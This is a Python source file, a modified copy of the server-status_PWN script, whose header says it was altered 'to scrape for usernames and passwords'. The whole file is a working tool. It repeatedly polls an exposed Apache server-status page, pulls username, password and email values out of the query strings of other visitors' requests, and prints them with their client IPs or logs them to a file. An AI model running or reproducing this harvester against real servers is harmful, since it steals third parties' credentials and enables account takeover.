### server-status_PWN
# A script that monitors and extracts URLs from Apache server-status.
### Homepage:
# https://github.com/mazen160/server-status_PWN
## Author:
# Mazin Ahmed <Mazin AT MazinAhmed DOT net>


#### THIS SCRIPT HAS BEEN MODDED TO SCRAPE FOR USERNAMES and PASSWORDS- sincerly Volt #####

# Modules
import time
import argparse
from urllib.parse import urlparse, parse_qs

# External modules
import requests
from bs4 import BeautifulSoup

# Disable SSL warnings
try:
	import requests.packages.urllib3
	requests.packages.urllib3.disable_warnings()
except:
	pass

client_cons = {}

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",
					dest="url",
					help="The Apache server-status URL.",
					action='store',
					required=True)
parser.add_argument("-f", "--filter_tags",
					dest="filter_tag",
					help="The Apache server-status filter.",
					action='store',
					default="")
parser.add_argument("--sleeping-time",
					dest="sleeping_time",
					help="Sleeping time between each request.\
					(Default: 10)",
					action='store',
					default=10)
parser.add_argument("-o", "--output",
					dest="output_path",
					help="Saves output constantly\
					into a newline-delimited output file.",
					action='store')
parser.add_argument("--enable-full-logging",
					dest="enable_full_logging",
					help="Enable full logging for all requests\
					with timestamps of each request.",
					action='store_true',
					default=False)
parser.add_argument("--debug",
					dest="enable_debug",
					help="Shows debugging information\
					for errors and exceptions",
					action='store_true',
					default=False)

args = parser.parse_args()

url = args.url if args.url else ''
sleeping_time = args.sleeping_time if args.sleeping_time else ''
output_path = args.output_path if args.output_path else ''
enable_full_logging = args.enable_full_logging
enable_debug = args.enable_debug
filter_tag = args.filter_tag


class tcolor:
	endcolor = '\033[0m'
	red = '\033[31m'
	green = '\033[32m'
	purple = '\033[35m'
	yellow = '\033[93m'
	light_blue = '\033[96m'


def Exception_Handler(e):
	global enable_debug
	if enable_debug is True:
		print('%s%s%s' % (tcolor.red, str(e), tcolor.endcolor))
	return(0)


class Request_Handler():
	def __init__(self):
		self.user_agent = 'Mozilla - Version 1.p.2 - Linux'
		self.timeout = '3'
		self.origin_ip = '127.0.0.1'
		self.additional_headers = {}

	def send_request(self, url):
		headers = {"User-Agent": self.user_agent, 'Accept': '*/*'}
		headers.update(self.additional_headers)
		try:
			req = requests.get(url,
							   headers=headers,
							   timeout=int(self.timeout),
							   verify=False,
							   allow_redirects=False)
			output = str(req.content)
		except Exception as e:
			Exception_Handler(e)
			output = ''
		return(output)


class Response_Handler():
	def validate_response(self, response):
		valid_patterns = ['<h1>Apache Server Status for']
		for pattern in valid_patterns:
			if pattern in response:
				return(True)
		return(False)

	def parse_response(self, response):
		VHOST_List = []
		REQUEST_URI_List = []
		FULL_URL_List = []
		CLIENT_IP_ADDRESS_List = []

		soup = BeautifulSoup(response, 'lxml')
		try:
			table_index_id = 0
			VHOST_index_id = -2
			REQUEST_URI_index_id = -1
			CLIENT_IP_ADDRESS_index_id = -4

			for _ in range(len(soup.findChildren('table')[table_index_id].findChildren('tr'))):
				if _ != 0:
					try:
						VHOST = soup.findChildren('table')[table_index_id].findChildren('tr')[_].findChildren('td')[VHOST_index_id].getText()
					except Exception as e:
						Exception_Handler(e)
						VHOST = ''
					try:
						REQUEST_URI = soup.findChildren('table')[table_index_id].findChildren('tr')[_].findChildren('td')[REQUEST_URI_index_id].getText().split(' ')[1]
					except Exception as e:
						Exception_Handler(e)
						REQUEST_URI = ''
					try:
						if (VHOST == REQUEST_URI == ''):
							FULL_URL = ''
						else:
							FULL_URL = 'http://' + str(VHOST) + str(REQUEST_URI)
					except Exception as e:
						Exception_Handler(e)
						FULL_URL = ''

					VHOST_List.append(VHOST)
					REQUEST_URI_List.append(REQUEST_URI)
					FULL_URL_List.append(FULL_URL)

					try:
						CLIENT_IP_ADDRESS = soup.findChildren('table')[table_index_id].findChildren('tr')[_].findChildren('td')[CLIENT_IP_ADDRESS_index_id].getText()
					except:
						CLIENT_IP_ADDRESS = ''

					CLIENT_IP_ADDRESS_List.append(CLIENT_IP_ADDRESS)

		except Exception as e:
			Exception_Handler(e)
			pass
		output = {"VHOST": VHOST_List, "REQUEST_URI": REQUEST_URI_List, "FULL_URL": FULL_URL_List, "CLIENT_IP_ADDRESS": CLIENT_IP_ADDRESS_List}
		return(output)


def output_to_file(output_data):
	try:
		o_file = open(output_path, 'a')
		o_file.write(str(output_data) + '\n')
		o_file.close()
	except Exception as e:
		print('%s[!] Error writing to file. %s' % (tcolor.red, tcolor.endcolor))
		Exception_Handler(e)
		return(1)
	return(0)

# VOLT - ADDED in parsing for usernames/passwords
def main(url, full_logging=False, filter_tag=""):
	error_limit = 20
	error_counter = 0
	user_info = {}
	pass_list = set()
	while True:
		output = Request_Handler().send_request(url)
		validate_output = Response_Handler().validate_response(output)
		if validate_output is not True:
			print('%s[!] Output does not seem to be valid.%s' % (tcolor.red, tcolor.endcolor))
			print('Trying again, feel free to exit [CTRL+C] and debug the issue.')
			Exception_Handler('Output: %s' % (output))
			error_counter = error_counter + 1
			if (error_limit <= error_counter):
				print('%s[!] Too many errors.%s' % (tcolor.red, tcolor.endcolor))
				print('\nExiting...')
				exit(1)
			else:
				pass
		else:
			parsed_output = Response_Handler().parse_response(output)

			for _ in range(len(parsed_output['FULL_URL'])):
				if parsed_output['FULL_URL'][_] != '':
					full_url = str(parsed_output['FULL_URL'][_])
					parsed_url = urlparse(full_url)
					q = parse_qs(parsed_url.query)
					user = q["username"] if "username" in q else ["none"]
					pas = q["password"] if "password" in q else ["none"]
					host = str(parsed_output['VHOST'][_])
					email = q["email"] if "email" in q else ["none"]
					change = False
					client_ip = str(parsed_output['CLIENT_IP_ADDRESS'][_]) 
					_id = user[0]
					for i in list(user_info.keys()):
						if i in _id:
							user_info[_id] = user_info[i]
					if filter_tag:
						if _id != "none":
							if _id in user_info.keys():
								if user[0].strip() and user_info[_id]["user"] != user[0] and len(user_info[_id]["user"]) < len(user[0]):
									user_info[_id]["user"] = user[0]
									change = True
								if pas[0].strip() and user_info[_id]["pas"] != pas[0] and len(user_info[_id]["pas"]) < len(pas[0]):
									user_info[_id]["pas"] = pas[0]
									change = True
								if host.strip() and user_info[_id]["host"] != host:
									user_info[_id]["host"] = host
									change = True
								if email[0].strip() and user_info[_id]["email"] != email[0] and len(user_info[_id]["email"]) < len(email[0]):
									user_info[_id]["email"] = email[0]
									change = True
							else:
								user_info[_id] = {"host": host, "pas":pas[0], "user":user[0], "email":email[0]}
								change = True

							if change and (_id in pass_list):
								print('[Client]: %s - Username: %s - Password: %s - Host: %s - Email: %s' % (client_ip, user_info[_id]["user"], user_info[_id]["pas"], user_info[_id]["host"], user_info[_id]["email"]))
								print(full_url + "\n")
							elif change and (filter_tag + "=" in parsed_output['FULL_URL'][_]) and (filter_tag+"=&" not in parsed_output['FULL_URL'][_]):
								print('[Client]: %s - Username: %s - Password: %s - Host: %s - Email: %s' % (client_ip, user_info[_id]["user"], user_info[_id]["pas"], user_info[_id]["host"], user_info[_id]["email"]))
								print(full_url + "\n")
								pass_list.add(_id)
					else:	
						print('%s[Client]: %s%s - %s[New URL]: %s %s%s%s' % (tcolor.purple, parsed_output['CLIENT_IP_ADDRESS'][_], tcolor.endcolor, tcolor.yellow, tcolor.endcolor, tcolor.green, str(parsed_output['FULL_URL'][_]), tcolor.endcolor))
					if (output_path != ''):
						output_to_file(str(parsed_output['FULL_URL'][_]))
					
		st = int(sleeping_time)
		while st != 0:
			# Display second in real time one the on liner (not \n everytime)
			time.sleep(1)
			print("\033[34m", end="")
			print(f"New request in {st} seconds...", end="")
			print("\033[0m\r", end="")
			st = st - 1
	return(0)


print("searching for " + str(filter_tag))
main(url, full_logging=enable_full_logging, filter_tag=str(filter_tag))

